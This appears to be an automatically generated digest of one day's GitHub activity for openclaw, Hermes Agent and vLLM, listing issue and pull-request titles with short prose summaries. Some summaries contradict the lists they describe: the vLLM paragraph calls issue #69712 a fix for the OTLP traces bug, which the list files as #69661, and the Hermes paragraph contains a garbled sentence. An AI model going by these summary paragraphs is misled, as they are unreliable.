- [#204677](https://github.com/openclaw/openclaw/issues/204677) [Bug]: Every update fails while the documented rescue-bot profile runs, and the report redacts away the sentence that says why `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204678](https://github.com/openclaw/openclaw/issues/204678) [Bug]: A worker spawn `EACCES` from an unreadable working directory is reported as an unreadable state database `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204680](https://github.com/openclaw/openclaw/issues/204680) [Feature]: Let plugins read Codex's default model `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:fix-shape-clear` `clawsweeper:needs-maintainer-review` 💬1
- [#204666](https://github.com/openclaw/openclaw/issues/204666) [Feature] provider-cache diagnostics: "unchanged-prefix" mislabels contention eviction and TTL expiry as engine drops `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204667](https://github.com/openclaw/openclaw/issues/204667) [Bug]: [Bug]: macOS app 2026.11.6 does not migrate app-managed Gateway (still 2026.11.3); doctor refuses with both CLIs `bug` `regression` `P0` `impact:ux-release-blocker` 💬1
- [#204665](https://github.com/openclaw/openclaw/issues/204665) No policy-respecting sink to capture raw node tool results to Gateway files `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204516](https://github.com/openclaw/openclaw/issues/204516) update: gateway install on a converted install bypasses the release launcher `P2` `issue-rating: 🦪 silver shellfish` `impact:ux-friction` 💬1
- [#204661](https://github.com/openclaw/openclaw/issues/204661) [Feature]: Make Talk settings show which mode and services are in use `enhancement` `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` 💬1
- [#204662](https://github.com/openclaw/openclaw/issues/204662) [Bug]: Sign in with ChatGPT returns HTTP 403 with no upstream request ID `bug` `regression` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` 💬1
- [#204657](https://github.com/openclaw/openclaw/issues/204657) [Bug]: Codex harness attaches images the agent only inspected to its visible reply `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `clawsweeper:needs-security-review` 💬1
- [#204419](https://github.com/openclaw/openclaw/issues/204419) Uninstalling the selected provider leaves a broken default without warning `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204584](https://github.com/openclaw/openclaw/issues/204584) [Bug]: Buzz plugin omits the configured auth tag on messages, so owner-only Buzz agents ignore the bot's mentions `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:source-repro` `clawsweeper:linked-pr-open` 💬1
- [#204420](https://github.com/openclaw/openclaw/issues/204420) Provider-specific Set up in the chat picker discards the selected provider `P2` `clawsweeper:source-repro` `issue-rating: 🦞 diamond lobster` `impact:ux-friction` 💬1
- [#204645](https://github.com/openclaw/openclaw/issues/204645) update_goal allows premature 'complete' and completed goals cannot be reopened `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:fix-shape-clear` `clawsweeper:needs-maintainer-review` 💬1
- [#204418](https://github.com/openclaw/openclaw/issues/204418) New-session model setup gate prevents `/login` from being the first message `P2` `clawsweeper:source-repro` `impact:auth-provider` `issue-rating: 🦞 diamond lobster` 💬1
- [#204633](https://github.com/openclaw/openclaw/issues/204633) Talk gateway-relay: the realtime provider's error is replaced by "Realtime provider error." and never logged `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:fix-shape-clear` `clawsweeper:needs-maintainer-review` 💬1
- [#204624](https://github.com/openclaw/openclaw/issues/204624) [Feature]: Configurable chat history window and automatic warming of recent conversations in the Control UI `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-product-decision` `issue-rating: 🌊 off-meta tidepool` 💬1
- [#204627](https://github.com/openclaw/openclaw/issues/204627) Update failure: gateway-recovery-verification (2026.10.4) `P2` `clawsweeper:needs-info` `issue-rating: 🦪 silver shellfish` `impact:ux-friction` 💬1
- [#204631](https://github.com/openclaw/openclaw/issues/204631) [Bug]: 2026.11.3 Codex harness: tts called from Codex code mode reports success in a message_tool_only Telegram topic, but no audio or reply is sent `P1` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `impact:message-loss` 💬1
- [#204564](https://github.com/openclaw/openclaw/issues/204564) `compaction.notifyUser`: preflight compaction notices never reach chat.send (webchat/app) clients; only slash commands get them live `no-stale` `P2` `clawsweeper:fix-shape-clear` `clawsweeper:queueable-fix` 💬1
- [#204615](https://github.com/openclaw/openclaw/issues/204615) [Bug]: Realtime relay caches a failed voice close as terminal and cannot retry the durable close `bug` `bug:behavior` `P2` `clawsweeper:no-new-fix-pr` 💬1
- [#204616](https://github.com/openclaw/openclaw/issues/204616) [Bug]: Prepared image reserves are destroyed when standing demand validation is temporarily unavailable `bug` `no-stale` `bug:behavior` `P2` 💬1
- [#204562](https://github.com/openclaw/openclaw/issues/204562) chat-history-reading-stability (webkit, 390 px): Home still leaves older history unloaded on slow runners `P2` `clawsweeper:needs-live-repro` `issue-rating: 🐚 platinum hermit` `impact:ux-friction` 💬1
- [#204614](https://github.com/openclaw/openclaw/issues/204614) [Feature]: Localize browser Web Push notification text (hardcoded English) `P2` `clawsweeper:no-new-fix-pr` `clawsweeper:needs-maintainer-review` `clawsweeper:needs-product-decision` 💬1
- [#204597](https://github.com/openclaw/openclaw/issues/204597) Retire unconsumed Control UI Swarm row annotations `P3` `clawsweeper:no-new-fix-pr` `clawsweeper:linked-pr-open` `issue-rating: 🌊 off-meta tidepool` 💬1

#### 🔒 Closed Issues
- [#160548](https://github.com/openclaw/openclaw/issues/160548) [Bug]: 2026.9.6 prepared-model-catalog worker leaks ~1 GiB per 5 min; each memory reclamation supersedes the runtime publication and kills every waiting turn
- [#154524](https://github.com/openclaw/openclaw/issues/154524) Accessibility: expose chat messages as headings for screen reader navigation
- [#151980](https://github.com/openclaw/openclaw/issues/151980) [Feature]: Session model pins should inherit the agent's fallback chain
- [#155271](https://github.com/openclaw/openclaw/issues/155271) [Bug]: Voice Call hangs up before realtime farewell audio finishes
- [#156985](https://github.com/openclaw/openclaw/issues/156985) Kubernetes: /tmp emptyDir lacks sticky protection required by fs-safe, disabling session observer
- [#169380](https://github.com/openclaw/openclaw/issues/169380) [Bug]: Codex OAuth profile rotation stops tool-using turns instead of continuing safely
- [#170994](https://github.com/openclaw/openclaw/issues/170994) [Bug]: Plugin approval request fails with "Approval requester authority changed" when an unrelated session changes during the wait
- [#194770](https://github.com/openclaw/openclaw/issues/194770) Investigate intermittent qualification failures from 2026.11.5-beta.2
- [#186631](https://github.com/openclaw/openclaw/issues/186631) Every fresh shared-state opener (CLI process or new Gateway worker thread) runs a full `PRAGMA integrity_check` in `state.admission.fast-path`; a writer error forces a foreground full check of a 727 MB agent DB (269 s), stalling that agent
- [#149994](https://github.com/openclaw/openclaw/issues/149994) [Bug]: the /approve page's Allow button is white text on a near-white background — it looks like an empty button
- [#138018](https://github.com/openclaw/openclaw/issues/138018) Swarm collector can freeze missing structured output before a valid terminal tool call is recorded
- [#167867](https://github.com/openclaw/openclaw/issues/167867) [Bug]: New owner input after Control UI reconnect loses cron management authority despite current admin authentication
- [#162649](https://github.com/openclaw/openclaw/issues/162649) Nested ignore rules misinterpret pattern characters in directory names
- [#166707](https://github.com/openclaw/openclaw/issues/166707) [Bug]: macOS app's local device-pairing connections (ui/node) never send their auth token, loop with token_missing indefinitely
- [#183129](https://github.com/openclaw/openclaw/issues/183129) [Bug]: Linux subreaper kills intentionally detached exec children
- [#194428](https://github.com/openclaw/openclaw/issues/194428) [Bug]: Control UI owner turn silently loses automation-management entitlement; admission inputs are not logged
- [#204704](https://github.com/openclaw/openclaw/issues/204704) [Bug]: Windows Scheduled Task restart and health CLI keep waiting after a resident Gateway trial commits
- [#132525](https://github.com/openclaw/openclaw/issues/132525) ask_user never shows its question on the Codex harness, then reports the user did not answer
- [#165717](https://github.com/openclaw/openclaw/issues/165717) [Bug]: Windows 2026.9.8 plugin install and rollback time out after replacement applied, with multi-minute event-loop stalls
- [#204818](https://github.com/openclaw/openclaw/issues/204818) Fast-track approval request: openclaw v2026.11.9 (321f1106)
- [#198259](https://github.com/openclaw/openclaw/issues/198259) commands.allowFrom silently denies ALL WebChat/Control UI slash commands on password-auth gateways (empty senderCandidates)
- [#194797](https://github.com/openclaw/openclaw/issues/194797) sessions_spawn child cannot use node-routed browser: missing scope operator.admin (still on 2026.11.1; #158055 closed stale)
- [#204905](https://github.com/openclaw/openclaw/issues/204905) [Bug]: efficient browser snapshots (and navigate page state) miss controls on deep pages: wrapper divs count toward depth 6
- [#176217](https://github.com/openclaw/openclaw/issues/176217) [Bug]: Native subagent restart recovery lacks original operator source for newly admitted CLI tasks
- [#197180](https://github.com/openclaw/openclaw/issues/197180) Feature: group workboard board links under the Workboard nav item instead of flat top-level Pages entries
- [#170367](https://github.com/openclaw/openclaw/issues/170367) [Feature]: OAuth usage-limit errors (ChatGPT/Codex 5h & weekly) should trigger auth profile rotation to the next configured OAuth account
- [#190270](https://github.com/openclaw/openclaw/issues/190270) secrets.egressProxy.enabled=true breaks gateway startup on Windows: "Secret egress proxy Worker is unavailable"
- [#204846](https://github.com/openclaw/openclaw/issues/204846) codex: question prompt escaping mangles URLs on text-fallback channels (_ -> U+FF3F, \n -> ?), user can't complete Browser step
- [#204256](https://github.com/openclaw/openclaw/issues/204256) [Bug]: claude-cli thinking snapshot duplicates a summary block (per-block assistant record matched by local index 0)
- [#204697](https://github.com/openclaw/openclaw/issues/204697) Use the shared cloud-worker config owner for profile editing
- [#204630](https://github.com/openclaw/openclaw/issues/204630) [Bug]: Live transcript update for scheduled-run sessions fails with "Cron job names need refresh; await prepareCronJobNameResolver"
- [#198360](https://github.com/openclaw/openclaw/issues/198360) [Bug]: Same-session cron continuation is abandoned after authority loss without preserving the cause
- [#204634](https://github.com/openclaw/openclaw/issues/204634) Gateway child survives with no listening socket after failed shutdown; cleanup abandons on coordination-channel errors (cancel-write EPIPE inside kill())
- [#204923](https://github.com/openclaw/openclaw/issues/204923) [Bug]: Sidebar New session stays disabled after the Gateway connects
- [#205072](https://github.com/openclaw/openclaw/issues/205072) [Feature]: The best versioning scheme is the X.Y.Z format, such as 2.0.12！！！
- [#204746](https://github.com/openclaw/openclaw/issues/204746) [Bug]: memory-core dreaming drops the Dream Diary entry when the REM-phase ingestion evicts light-staged rows from a full recall store
- [#204356](https://github.com/openclaw/openclaw/issues/204356) Show context compaction inline with chat activity
- [#195635](https://github.com/openclaw/openclaw/issues/195635) Android: cancelling a ticketed gateway media download does not abort the in-flight HTTP call
- [#195629](https://github.com/openclaw/openclaw/issues/195629) Android: saved-gateway connection toggle switch has no accessibility label
- [#202004](https://github.com/openclaw/openclaw/issues/202004) [Bug]: models auth list shows expired cooldown/disabled windows as active, with recovery hints
- [#204940](https://github.com/openclaw/openclaw/issues/204940) [Bug]: Conversation Versions and session previews show stray backticks after linked inline code
- [#204939](https://github.com/openclaw/openclaw/issues/204939) [Bug]: Mattermost file caption chunks split a named Markdown link across posts
- [#204902](https://github.com/openclaw/openclaw/issues/204902) [Bug]: Fresh Knowledge chat fails context precheck with direct tool schemas
- [#197280](https://github.com/openclaw/openclaw/issues/197280) [Feature]: Support MiniMax /v1/images/generations so image_generate can use MiniMax-H3-Image
- [#204892](https://github.com/openclaw/openclaw/issues/204892) [Bug]: Valid $include blocks first Gateway start after upgrade from 2026.11.7
- [#204891](https://github.com/openclaw/openclaw/issues/204891) [Bug]: PostgreSQL-backed Gateway accepts concurrent first chat turns that never reach the model
- [#204944](https://github.com/openclaw/openclaw/issues/204944) Control UI usage-page widget shows "Re-login needed" on rate-limit (429), not just auth failure
- [#204893](https://github.com/openclaw/openclaw/issues/204893) [Bug]: First Gateway start after upgrade exits on ext4 lost+found in the state directory
- [#204936](https://github.com/openclaw/openclaw/issues/204936) [Bug]: `infer model run` trims prompt whitespace on the default Gateway route
- [#204935](https://github.com/openclaw/openclaw/issues/204935) [Bug]: `infer model run` fails on literal `HEARTBEAT_OK` and `NO_REPLY` replies through the Gateway
- [#204903](https://github.com/openclaw/openclaw/issues/204903) [Bug]: Worktrees branch picker keeps parent branches after git init in a subfolder
- [#204227](https://github.com/openclaw/openclaw/issues/204227) [Bug]: update check-release rejects a cleanly closed WAL-mode agent database when its SHM file is absent
- [#204394](https://github.com/openclaw/openclaw/issues/204394) update: failed trial does not restore agent databases registered outside the state directory
- [#204405](https://github.com/openclaw/openclaw/issues/204405) [Feature]: Let session writers run a plugin’s read-only helper in their own chat
- [#204649](https://github.com/openclaw/openclaw/issues/204649) test: subagent-registry.requester-wake.e2e 'settles requester receipts' cases time out at 120 s
- [#202040](https://github.com/openclaw/openclaw/issues/202040) [Bug]: Docker: openclaw-cli has no shared PID namespace, so setup.sh and documented config/channel writes are refused once the Gateway runs
- [#204740](https://github.com/openclaw/openclaw/issues/204740) [Bug]: Android notification updates with the same key are each queued as a new event, so one ongoing notification wakes the agent repeatedly
- [#204659](https://github.com/openclaw/openclaw/issues/204659) Consolidate primary and managed session-list request lifecycle ownership
- [#204667](https://github.com/openclaw/openclaw/issues/204667) [Bug]: [Bug]: macOS app 2026.11.6 does not migrate app-managed Gateway (still 2026.11.3); doctor refuses with both CLIs
- [#204419](https://github.com/openclaw/openclaw/issues/204419) Uninstalling the selected provider leaves a broken default without warning
- [#204420](https://github.com/openclaw/openclaw/issues/204420) Provider-specific Set up in the chat picker discards the selected provider
- [#204418](https://github.com/openclaw/openclaw/issues/204418) New-session model setup gate prevents `/login` from being the first message
- [#204363](https://github.com/openclaw/openclaw/issues/204363) update: on PostgreSQL, a crash after migration leaves no Gateway running
- [#204276](https://github.com/openclaw/openclaw/issues/204276) [Bug]: npm reinstall after release conversion hides CLI/Gateway version split in update status
- [#204564](https://github.com/openclaw/openclaw/issues/204564) `compaction.notifyUser`: preflight compaction notices never reach chat.send (webchat/app) clients; only slash commands get them live
- [#204562](https://github.com/openclaw/openclaw/issues/204562) chat-history-reading-stability (webkit, 390 px): Home still leaves older history unloaded on slow runners
- [#204597](https://github.com/openclaw/openclaw/issues/204597) Retire unconsumed Control UI Swarm row annotations

### Hermes Agent (`nousresearch/hermes-agent`)

**Stars:** 265,945 · **Open issues:** 54,341 · **Last push:** <1h ago

On November 23, 2026, Hermes Agent released version v0.23.4, a patch update incorporating approximately 229 merged pull requests since v0.23.3, aimed at stabilizing the platform across various distribution channels including the GitHub release, Microsoft Store, Docker, and Hermes Cloud. The day also marked the introduction of a canary release, canary.20261124T064706Z-v0.23.3, on November 24, which brings ongoing improvements but does not yet constitute a stable version. A notable merged pull request was #159910, which enhances desktop testing by refining reroute mechanics. Among the new issues, #159886 highlights a significant bug where whole-index routing saves experience performance issues by rewriting 35,000 rows on each persist, causing timeouts in desktop operations.

#### 🚀 New Releases
- [v0.23.4](https://github.com/nousresearch/hermes-agent/releases/tag/v0.23.4) Hermes Agent v0.23.4
- [canary.20261124T064706Z-v0.23.3](https://github.com/nousresearch/hermes-agent/releases/tag/canary.20261124T064706Z-v0.23.3) Hermes Agent canary canary.20261124T064706Z-v0.23.3

#### ✅ Merged PRs
- [#159910](https://github.com/NousResearch/hermes-agent/pull/159910) test(desktop): fire the second reroute move while the first redial waits

#### 🐛 New Issues
- [#159912](https://github.com/NousResearch/hermes-agent/issues/159912) Skills: a localized `description` (trigger) line blocks updates — needs an override outside SKILL.md `type/feature` `comp/cli` `tool/skills` `area/config` 💬1
- [#159886](https://github.com/NousResearch/hermes-agent/issues/159886) [Bug]: whole-index routing save rewrites ~35k rows on every persist (8.5s write lock on a 2.9 GB state.db) — Desktop "session.control.read" times out at 30s `type/perf` `comp/gateway` `P2` `area/sessions` 💬1
- [#159709](https://github.com/NousResearch/hermes-agent/issues/159709) [Bug]: ‼️ `write_file` permanently blocked on modified files on Windows (`os.fstat` vs `os.stat` `st_ctime_ns` mismatch in `_file_version`) `type/bug` `comp/tools` `tool/file` `P2` 💬1
- [#159882](https://github.com/NousResearch/hermes-agent/issues/159882) [Bug]: skill_view returns the "unchanged" stub after it re-prompted for and stored a missing secret, so the agent asks for the secret in chat `type/bug` `comp/tools` `tool/skills` `area/auth` 💬1
- [#159920](https://github.com/NousResearch/hermes-agent/issues/159920) BUG: memory zero-match feedback never crosses stores — wrong-target patches retry blind into the 'Memory consolidation failed' cap `type/bug` `comp/tools` `tool/memory` `P2`
- [#159919](https://github.com/NousResearch/hermes-agent/issues/159919) browser backend leaks hundreds of renderer processes (12 GB RAM, 96% memory) `type/perf` `comp/tools` `tool/browser` `P2`
- [#159917](https://github.com/NousResearch/hermes-agent/issues/159917) [Bug]: `hermes update` spends 57 minutes in a silent state.db integrity_check (no progress, no size-aware cap below the 2 GiB ceiling) `type/perf` `comp/cli` `P2` `area/sessions`
- [#159916](https://github.com/NousResearch/hermes-agent/issues/159916) Bot Mode: message_agent replies over ~2,000 chars arrive empty ("showing last 0 chars") `type/bug` `comp/gateway` `P2`
- [#159915](https://github.com/NousResearch/hermes-agent/issues/159915) [Bug]: Desktop Archive & retention badge stays stale after sessions are removed outside the app `type/perf` `P2` `comp/desktop` `area/sessions`
- [#159909](https://github.com/NousResearch/hermes-agent/issues/159909) Telegram duplicate final-send warning on v0.21.0 without confirmed duplicate delivery `type/bug` `comp/gateway` `platform/telegram` `P2`
- [#159908](https://github.com/NousResearch/hermes-agent/issues/159908) [Bug]: Successful /models probes are never persisted for the modern `providers:` config shape — `_save_discovered_models_to_config` only handles legacy `custom_providers:` lists `type/bug` `comp/cli` `area/config` `P2`
- [#159907](https://github.com/NousResearch/hermes-agent/issues/159907) [Bug]: whatsapp_cloud drops inbound messages from username users (no `from`, only `from_user_id`/BSUID) and cannot reply to a BSUID `type/bug` `comp/gateway` `comp/plugins` `platform/whatsapp`
- [#159904](https://github.com/NousResearch/hermes-agent/issues/159904) [local-runtime] Qwen3.8-27B DFlash `draft_depth: 7` is slower than depth 3 on Vulkan/AMD on every workload measured (10-55%) `type/perf` `area/config` `P2` `area/local-models`
- [#159903](https://github.com/NousResearch/hermes-agent/issues/159903) [Feature]: Evaluate Bun as an opt-in runtime for the JS surfaces, starting with CI validation `type/feature` `P3`
- [#159902](https://github.com/NousResearch/hermes-agent/issues/159902) [Bug][Desktop][macOS]: Composer right-click Cut does nothing and Paste always inserts at the start of the draft `type/bug` `P2` `comp/desktop` `desktop/chat`
- [#159901](https://github.com/NousResearch/hermes-agent/issues/159901) [Bug]: Windows denies access to bundled Git when installing plugins `type/bug` `P2` `comp/desktop` `desktop/settings`
- [#159898](https://github.com/NousResearch/hermes-agent/issues/159898) Desktop/Webapp boundary never auto-recovers from React's `removeChild` NotFoundError (blank retry screen; message is localized, so text matching misses it) `type/bug` `P2` `comp/dashboard` `area/webapp`
- [#159897](https://github.com/NousResearch/hermes-agent/issues/159897) [Bug]: Foreground terminal commands inherit hermes-gateway.service cgroup — gateway restart SIGKILLs external daemons (adb, local sidecars) `type/bug` `comp/tools` `tool/terminal` `backend/local`
- [#159895](https://github.com/NousResearch/hermes-agent/issues/159895) pm/lock.json: bump bundled Node.js 26.12.1 → 26.13.1 (Nov 10, 2026 Node.js security release) `type/security` `comp/tools` `P3` `area/install-update`
- [#159894](https://github.com/NousResearch/hermes-agent/issues/159894) Add database retrieval and data-source queries to the managed Notion connector `type/feature` `comp/tools` `P3` `comp/portal`
- [#159884](https://github.com/NousResearch/hermes-agent/issues/159884) [Bug]: Desktop over SSH: the primary (opened-on) profile is missing $HERMES_HOME model-provider plugins in the model picker `type/bug` `comp/gateway` `P3` `area/profiles`

#### 🔒 Closed Issues
- [#150617](https://github.com/NousResearch/hermes-agent/issues/150617) `gateway/run_notifications.py` completion notification ignores `completion_output_chars` and can truncate the tail to 0 chars (Bot Mode DM replies arrive empty)
- [#131786](https://github.com/NousResearch/hermes-agent/issues/131786) [Bug]: gateway completion tail drops all useful output for long single-line JSON
- [#158043](https://github.com/NousResearch/hermes-agent/issues/158043) gateway: bg-process completion notification truncates to 0 chars when the line-boundary snap eats the whole tail (sys-wv4zo0)
- [#152075](https://github.com/NousResearch/hermes-agent/issues/152075) [notifications] single-line process output degrades to "showing last 0 chars" — bot_mode_dm replies swallowed
- [#151053](https://github.com/NousResearch/hermes-agent/issues/151053) [Bug]: Completion notification can become empty for long single-line output ending in a newline
- [#149830](https://github.com/NousResearch/hermes-agent/issues/149830) Profile export writes symlink members that profile import refuses (#62194 closed unmerged)
- [#156575](https://github.com/NousResearch/hermes-agent/issues/156575) [Bug]: cron run in the hermes console silently resumes a paused job, while the CLI, /cron run and the agent tool refuse
- [#156671](https://github.com/NousResearch/hermes-agent/issues/156671) [Bug]: TodoStore._sanitize_parents pops parent from traversal root instead of cycle node
- [#146034](https://github.com/NousResearch/hermes-agent/issues/146034) [Bug]: ComfyUI HTTP helper retries unknown-outcome workflow submissions
- [#148262](https://github.com/NousResearch/hermes-agent/issues/148262) pm strips UV_CONCURRENT_DOWNLOADS, so a slow link cannot lower download concurrency — parallel large wheels all hit the HTTP timeout
- [#156760](https://github.com/NousResearch/hermes-agent/issues/156760) Background process wake-up renders an empty body when the output is one long line (>2000 chars)

---

## ⚙️ AI Infrastructure

### vLLM (`vllm-project/vllm`)

**Stars:** 97,516 · **Open issues:** 11,116 · **Last push:** <1h ago

On November 25, 2026, there were no new releases for vLLM. Significant progress was made with the merging of several important pull requests, including #69605, which enables XPU graph mode for six recipes, and #68614, which allows new requests to be admitted past idle empty steps while resizing prefill microbatches from the backlog. Notably, the bug fix #69712 addressed issues with the --otlp-traces-endpoint not sending spans when another integration owns the global tracer provider, while #69590 proposed a new RFC focused on fault tolerance for RL workloads within vLLM. The day's activity also saw the filing of notable new issues, including #69660, which reports a failure of Inkling-2-Mini with Triton 3.9 due to a missing reinterpret feature.

#### ✅ Merged PRs
- [#69605](https://github.com/vllm-project/vllm/pull/69605) [XPU] Enable XPU graph mode for 6 recipes
- [#69794](https://github.com/vllm-project/vllm/pull/69794) [Misc] Remove remaining xformers references
- [#69653](https://github.com/vllm-project/vllm/pull/69653) [XPU] add spec decode UT
- [#68614](https://github.com/vllm-project/vllm/pull/68614) [Core][PP] Admit new requests past idle empty steps, and size prefill microbatches from the backlog
- [#62631](https://github.com/vllm-project/vllm/pull/62631) [XPU][LoRA] Support MXFP4 MoE LoRA via XpuFusedMoe hooks
- [#61691](https://github.com/vllm-project/vllm/pull/61691) [Feature] Add workload snapshots to iteration metrics
- [#65079](https://github.com/vllm-project/vllm/pull/65079) [Bugfix][EC] Reuse runner cache hits before remote admission
- [#68308](https://github.com/vllm-project/vllm/pull/68308) [XPU] Flatten N-D input in XPU W8A16 FP8 linear kernel
- [#65742](https://github.com/vllm-project/vllm/pull/65742) [ROCm][Perf][DSv4.1] Use the single-kernel DSv4 top-k on ROCm gfx950
- [#69135](https://github.com/vllm-project/vllm/pull/69135) [Perf][Kernel][GDN] Fuse the prefill causal conv1d + post-conv prep into one CUDA kernel
- [#66466](https://github.com/vllm-project/vllm/pull/66466) [Perf][Multimodal] Reuse OpenCV capture for video metadata
- [#69383](https://github.com/vllm-project/vllm/pull/69383) [Rust Frontend] Exclude frontend and install-time env vars from compile factors
- [#68841](https://github.com/vllm-project/vllm/pull/68841) [Rust Frontend] Gate opt-in features at startup through typed flags
- [#69729](https://github.com/vllm-project/vllm/pull/69729) [Docs] Reduce docs build size below the Read the Docs limit
- [#67039](https://github.com/vllm-project/vllm/pull/67039) [ROCm][MiniMax-M3.1] All gather in FP4 in TP configs
- [#69461](https://github.com/vllm-project/vllm/pull/69461) [Security] Bound synchronous media body fetches
- [#69706](https://github.com/vllm-project/vllm/pull/69706) [Core] Remove dead pcp_world_size plumbing from KV cache managers
- [#66969](https://github.com/vllm-project/vllm/pull/66969) [KVConnector] Enable HF3FS KV connector on non-CUDA devices
- [#67306](https://github.com/vllm-project/vllm/pull/67306) [ROCm][Muse Spark] Decode MoE on native routes
- [#67382](https://github.com/vllm-project/vllm/pull/67382) [ROCm][Spec Decode][Muse Spark] Fuse the DSpark Markov sampling steps
- [#66327](https://github.com/vllm-project/vllm/pull/66327) [Bugfix][Rust Frontend] Bump fastokens to 0.3.6
- [#69186](https://github.com/vllm-project/vllm/pull/69186) [Perf][XPU] Run the fp32 lm_head through torch.mm(out_dtype=float32) on XPU
- [#69707](https://github.com/vllm-project/vllm/pull/69707) [CI][ROCm][DSv4.1] Pool 16 decode pairs at TP8 in the mono layers test
- [#69698](https://github.com/vllm-project/vllm/pull/69698) [Kernel] Keep L1::no_allocate on CuTeDSL GEMM epilogue stores
- [#68728](https://github.com/vllm-project/vllm/pull/68728) [Transformers backend] Migrate SarvamMLA and SarvamMoE
- [#69752](https://github.com/vllm-project/vllm/pull/69752) [ROCm][Docs] DeepSeek-V4.1-Flash: MI355X AgentX TP and DP presets from InferenceX #5195
- [#69749](https://github.com/vllm-project/vllm/pull/69749) [Recipe] Kimi-K3.1-Pro: MI355X kimi-k31-020490a image (amd_kernels bridge) and FlyDSL draft attention, align with InferenceX#5196
- [#69683](https://github.com/vllm-project/vllm/pull/69683) [Model] Support OmniASR via the Transformers backend
- [#69636](https://github.com/vllm-project/vllm/pull/69636) [Perf][Parser] Skip streaming argument deltas in a single-pass parse
- [#69500](https://github.com/vllm-project/vllm/pull/69500) [Perf][Parser] Drain the incremental lexer in linear time
- [#69751](https://github.com/vllm-project/vllm/pull/69751) [CI] Fix mypy errors in tests/v1/core and tests/v1/engine
- [#69564](https://github.com/vllm-project/vllm/pull/69564) [Deprecation] Remove LM Format Enforcer structured outputs backend
- [#62004](https://github.com/vllm-project/vllm/pull/62004) [Kernel] ReplaySSM: cache SSM inputs for faster Gated DeltaNet standard decode
- [#53377](https://github.com/vllm-project/vllm/pull/53377) [Bugfix][Distributed] Gate MNNVL allreduce workspace creation on fabric support
- [#65740](https://github.com/vllm-project/vllm/pull/65740) [CI] Enable mypy for tests/v1/core and tests/v1/engine
- [#64163](https://github.com/vllm-project/vllm/pull/64163) [MoE] Use sorted fused-MoE path on integrated GPUs for multi-token batches (#63943)
- [#68820](https://github.com/vllm-project/vllm/pull/68820) [HiSparse] Reuse finished requests' GPU copies before cached prefixes
- [#66416](https://github.com/vllm-project/vllm/pull/66416) [Transformers backend] Migrate InternLM3, IQuestCoder, EXAONE 3 and GPT-J
- [#69637](https://github.com/vllm-project/vllm/pull/69637) [Perf][Parser] Find GLM-4.7 tool-call arguments in linear time
- [#66720](https://github.com/vllm-project/vllm/pull/66720) [Bugfix] Don't report sibling cache hits in n>1 prefill stats
- [#69695](https://github.com/vllm-project/vllm/pull/69695) [Transformers backend] Apply checkpoint conversions that split a tensor
- [#56239](https://github.com/vllm-project/vllm/pull/56239) [Bugfix][Core] Avoid initializing CUDA while resolving AllReduce+RMSNorm fusion config
- [#69129](https://github.com/vllm-project/vllm/pull/69129) [CI] Bump Transformers version to 5.24.1
- [#68912](https://github.com/vllm-project/vllm/pull/68912) [Rust Frontend] Fail at launch for multimodal models the Rust frontend cannot serve
- [#68839](https://github.com/vllm-project/vllm/pull/68839) [Model][ROCm] Hy4 and Hy4-Flash enablement and recipe on ROCm
- [#68747](https://github.com/vllm-project/vllm/pull/68747) [HiSparse] Share the host pool per node under multi-node TP
- [#48354](https://github.com/vllm-project/vllm/pull/48354) [Bugfix] Fix collect_env.py crash on non-Linux platforms
- [#69693](https://github.com/vllm-project/vllm/pull/69693) [CI] Run (H200) EC Filesystem Tiering on a 35GB MIG slice

#### 🐛 New Issues
- [#69712](https://github.com/vllm-project/vllm/issues/69712) [RFC][XPU] Inkling 2 on Intel XPU: shared `inkling2/common/` implementation and PR series `rocm` `intel-gpu` `quantization` `kimi` 💬4
- [#69661](https://github.com/vllm-project/vllm/issues/69661) [Bug]: --otlp-traces-endpoint sends no spans when another integration owns the global tracer provider 💬2
- [#69791](https://github.com/vllm-project/vllm/issues/69791) [Bug]: Malformed message-level input on the DeepSeek-V4 and V4.1 chat encoders returns HTTP 500 instead of 400 `rocm` `deepseek` 💬2
- [#69790](https://github.com/vllm-project/vllm/issues/69790) [Bug]: qwen3_xml and k2_horizon tool parsers return HTTP 500 when tool properties is not a dict `tool-calling` 💬2
- [#69740](https://github.com/vllm-project/vllm/issues/69740) [Bug][ROCm]: GPU arch is read from the first amdsmi handle, not the visible device, on hosts with mixed AMD GPUs `rocm` 💬2
- [#69662](https://github.com/vllm-project/vllm/issues/69662) [KVConnector] Fall back to legacy IPC when the extensible KV cache is unavailable 💬2
- [#69590](https://github.com/vllm-project/vllm/issues/69590) [RFC] Fault Tolerance for RL Workloads in vLLM `rocm` `RFC` `rl` 💬1
- [#69786](https://github.com/vllm-project/vllm/issues/69786) [Feature]: KV connectors with external_launcher: shared request IDs, TP-scoped save quorum, public pending-work query 💬1
- [#69789](https://github.com/vllm-project/vllm/issues/69789) [Tracking Issue] HY4 / HY4-Flash support and performance roadmap `rocm` 💬1
- [#69766](https://github.com/vllm-project/vllm/issues/69766) [CI Failure]: test_per_token_head_kv_cache_accuracy[int4_per_token_head] on MI355 DPX since #66547 (int4 not stable at a flat position) `rocm` `ci-failure` `quantization` 💬1
- [#69781](https://github.com/vllm-project/vllm/issues/69781) [Bug]: Online FP8 with TP > 1 quantizes layers with wrong scales when multi-thread safetensors loading is on `rocm` `quantization` 💬1
- [#69569](https://github.com/vllm-project/vllm/issues/69569) [Feature]: HY4 Flash sparse attention on NVIDIA Ada (SM89 / RTX 4090) `nvidia` 💬1
- [#69742](https://github.com/vllm-project/vllm/issues/69742) [Bug][ROCm]: Extensible KV cache makes decode ~44% slower on gfx1201 (Radeon AI PRO R9700, Gemma-4 W4A16) `rocm` `quantization` 💬1
